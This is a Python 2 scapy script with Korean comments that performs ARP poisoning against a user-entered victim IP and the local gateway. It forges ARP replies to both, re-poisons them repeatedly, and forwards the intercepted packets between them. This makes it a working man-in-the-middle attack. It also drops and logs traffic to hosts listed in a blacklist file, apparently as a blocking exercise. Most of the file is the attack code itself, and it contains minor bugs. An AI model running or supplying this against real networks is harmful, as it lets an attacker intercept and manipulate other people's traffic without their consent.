#-*- coding: utf-8 -*-


###################################################
# platform : OS X Yosemite
# SDK : Sublime Text 2
# Language : Python2.7
# Lib : scapy
# Country : Korea
# Developer : j0dev
# Email : rig0408@naver.com
# Blog : blog.jodev.kr
# 
###################################################


from scapy.all import *
import socket
import datetime
#파이썬 네트워크 패킷 라이브러리 scapy 사용

thistime = datetime.datetime.now()

des_ip = raw_input("Input Target IP : ")
#victim의 ip 입력받음

results, unanswered = sr(ARP(op=ARP.who_has, pdst=des_ip))
#results[0][1];
#Victim ip로 arp request 전송
#결과 예시 (<ARP  op=who-has pdst=172.20.10.9 |>, <ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=10:02:b5:a5:78:05 psrc=172.20.10.9 hwdst=80:e6:50:0f:27:aa pdst=172.20.10.2 |>)
result = str(results[0])
result = result.split("hwsrc=")[1]
victim_mac = result.split(" psrc")[0].strip()

result = result.split("hwdst=")[1]
attacker_mac = result.split(" pdst=")[0].strip()

result =result.split("pdst=")[1]
attacker_ip = result.split(" |")[0].strip()
#victim mac, attacker mac, attacker ip 수집


dev = conf.iface
#사용중인 네트워크 디바이스 불러옴
gateway = str(conf.route)
#결과 예시
#=================================================================================
#scapy
#conf.route
#Network         Netmask         Gateway         Iface           Output IP
#0.0.0.0         0.0.0.0         192.168.32.254  en0             192.168.32.194
#=================================================================================
gateway = gateway.split(dev)[0]
gateway = gateway.split()
gateway_n = len(gateway)
router_ip = gateway[gateway_n-1]
#라우터 아이피 추출


results, unanswered = sr(ARP(op=ARP.who_has, pdst=router_ip))
#라우터로 arp_request 전송
#결과 예시 (<ARP  op=who-has pdst=192.168.32.254 |>, <ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=2c:21:72:93:df:00 psrc=192.168.32.254 hwdst=80:e6:50:0f:27:aa pdst=192.168.32.194 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>)
result = str(results[0])
result = result.split("hwsrc=")[1]
router_mac = result.split(" psrc")[0].strip()
#라우터의 맥주소 수집

print "Victim IP : "+des_ip
print "Victim MAC : "+victim_mac
print "Attacker IP : "+attacker_ip
print "Attacker_mac : "+attacker_mac
print "Router IP : "+router_ip
print "Router MAC : "+router_mac

#####################################################################
blacklist = []
f = open("./mal_site.txt",'r')

for line in f:
	name = line.strip('\n')
	name = line.strip('https://')
	name = line.strip('http://')
	name = line.split("/")[2].strip()
	
	try:
		host = socket.gethostbyname_ex(name)
		host = list(host[2])
		#host = list(host)
		host_len = len(host)
		for i in host:
			blacklist.append(i)
		#blacklist.append(host)
	except socket.gaierror, err:
		print "cannot resolve host: ", name, err,"DNS NOT Found"
print blacklist

f.close




#######################################################################
# Forge the ARP packet for the victim
arpFakeVic = ARP()
arpFakeVic.op=2
arpFakeVic.psrc=router_ip
arpFakeVic.pdst=des_ip
arpFakeVic.hwdst=victim_mac

# Forge the ARP packet for the default GW
arpFakeDGW = ARP()
arpFakeDGW.op=2
arpFakeDGW.psrc=des_ip
arpFakeDGW.pdst=router_ip
arpFakeDGW.hwdst=router_mac

send(arpFakeVic)
send(arpFakeDGW)
#초기 ARP 감염



def arp_monitor_callback(pkt):

	if ARP in pkt:
			send(arpFakeVic)
			send(arpFakeDGW)
			print "ARP Poison"
	#ARP패킷을 판단하여 다시 ARP Infection 날림
	else:
		#IP검증 후 차단
		if pkt[IP].dst in blacklist:
			print "IP.DST : ", pkt[IP].dst, "in BlackList"
			print "IP.DST : ", pkt[IP].dst, "in BlackList"
			print "IP.DST : ", pkt[IP].dst, "in BlackList"
			print "IP.DST : ", pkt[IP].dst, "in BlackList"
			print "IP.DST : ", pkt[IP].dst, "in BlackList"
			print "IP.DST : ", pkt[IP].dst, "in BlackList"
			#Blacklist_Access_Denied_List로 차단된 시간, IP, Write
			f = open("./Blacklist_Access_Denied_List", 'a')
			data = str(thistime)+": IP.DST : "+pkt[IP].dst+"in BlackList\n"
			f.write(data)
			f.close


			return 
		#IP검증 후 차단
		elif pkt[IP].src in blacklist:
			print "IP.SRC : ", pkt[IP].src, "in BlackList"
			print "IP.SRC : ", pkt[IP].src, "in BlackList"
			print "IP.SRC : ", pkt[IP].src, "in BlackList"
			print "IP.SRC : ", pkt[IP].src, "in BlackList"
			print "IP.SRC : ", pkt[IP].src, "in BlackList"
			print "IP.SRC : ", pkt[IP].src, "in BlackList"
			#Blacklist_Access_Denied_List로 차단된 시간, IP, Write
			f = open("./Blacklist_Access_Denied_List", 'a')
			data = str(thistime)+": IP.SRC : "+pkt[IP].src+"in BlackList\n"
			f.write(data)
			f.close


			return 
		else:
			if pkt[IP].src==des_ip:
				pkt[Ether].src = attacker_mac
				pkt[Ether].dst = router_mac
				if pkt.haslayer(UDP) == 1:
					del pkt[UDP].chksum
					del pkt[UDP].len
			
				del pkt.chksum
				del pkt.len
				sendp(pkt)
				print "SRC : Victim_MAC"
				#victim에서 패킷을 보낼때 (scapy에서 패킷을 다시 보낼때, IP와 UDP(일경우)의 chksum과 len을 지워줘야 오류가 안뜸)
			if pkt[IP].dst==des_ip:
				pkt[Ether].src = attacker_mac
				pkt[Ether].dst = victim_mac
				if pkt.haslayer(UDP) == 1:
					del pkt[UDP].chksum
					del pkt[UDP].len
				del pkt.len
				del pkt.chksum
				sendp(pkt)
				print "DST : Victim_MAC"
			#router에서 패킷을 보낼때 (scapy에서 패킷을 다시 보낼때, IP와 UDP(일경우)의 chksum과 len을 지워줘야 오류가 안뜸)

while True:
	sniff(prn=arp_monitor_callback, filter="host "+router_ip+" or host "+des_ip, count=1)
	#패킷을 한개씩 스니핑하여 판단.
